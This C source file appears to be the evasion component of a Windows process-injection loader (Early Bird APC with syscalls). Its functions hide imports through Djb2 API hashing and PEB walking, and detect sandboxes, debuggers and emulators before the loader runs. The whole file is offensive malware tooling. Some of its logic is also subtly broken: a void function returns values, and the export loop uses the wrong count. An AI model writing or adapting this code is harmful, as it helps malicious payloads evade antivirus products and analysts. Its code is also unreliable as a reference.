#include "Evasion.h"
#include "EarlyBirdAPCInjectionSyscalls.h"

//Pseudo handle
#define NtCurrentProcess() ((HANDLE)-1)

//API Hashing using Djb2 for ANSI and Unicode
DWORD HashStringDjb2A(PCHAR String)
{
	ULONG Hash = INITIAL_HASH;
	INT c;
	while (c = *String++)
		Hash = ((Hash << INITIAL_SEED) + Hash) + c;
	return Hash;
}

DWORD HashStringDjb2W(PWCHAR String)
{
	ULONG Hash = INITIAL_HASH;
	INT c;
	while (c = *String++)
		Hash = ((Hash << INITIAL_SEED) + Hash) + c;
	return Hash;
}

//function to replace GetProcAddress
FARPROC NotGetProcAddress(IN HMODULE hModule, IN DWORD dwApiNameHash) {

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;

	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// Looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		if (dwApiNameHash == HASH_ANSI(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}

//GetModuleHandle replacement
HMODULE NotGetModuleHandle(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {
		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
			CHAR UpperCaseDllName[MAX_PATH];
			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';
			if (HASH_ANSI(UpperCaseDllName) == dwModuleNameHash)
				return pDte->Reserved2[0];
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}


int CheckSleepForwarding() {
	DWORD startTime = GetTickCount();
	Sleep(2000);
	double elapsedTime = (GetTickCount() - startTime) / 1000.0;
	return (elapsedTime < 1.5) ? -1 : 0;
}

int CheckDebuggerPresence(fnIsDebuggerPresent pIsDebuggerPresent) {
	return pIsDebuggerPresent() ? -2 : 0;
}

int CheckApiEmulation1(fnFlsAlloc pFlsAlloc) {
	return (pFlsAlloc(0) == NULL) ? -3 : 0;
}

int CheckApiEmulation2(fnVirtualAllocExNuma pVirtualAllocExNuma) {
	return (pVirtualAllocExNuma(NtCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0) == NULL) ? -4 : 0;
}

int CheckExecControl() {
	HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "wuauctl");
	return (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) ? -5 : 0;
}

//IAT Hiding - functions
void InitEvasion() {
	fnVirtualAllocExNuma pVirtualAllocExNuma;
	fnFlsAlloc pFlsAlloc;
	fnIsDebuggerPresent pIsDebuggerPresent;

	pVirtualAllocExNuma = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_VIRTUALALLOCEXNUMA);
	pFlsAlloc = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_FLSALLOC);
	pIsDebuggerPresent = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_ISDEBUGGERPRESENT);

	if (CheckSleepForwarding() < 0) return -1;
	if (CheckDebuggerPresence(pIsDebuggerPresent) < 0) return -2;
	if (CheckApiEmulation1(pFlsAlloc) < 0) return -3;
	if (CheckApiEmulation2(pVirtualAllocExNuma) < 0) return -4;
	if (CheckExecControl() < 0) return -5;
}
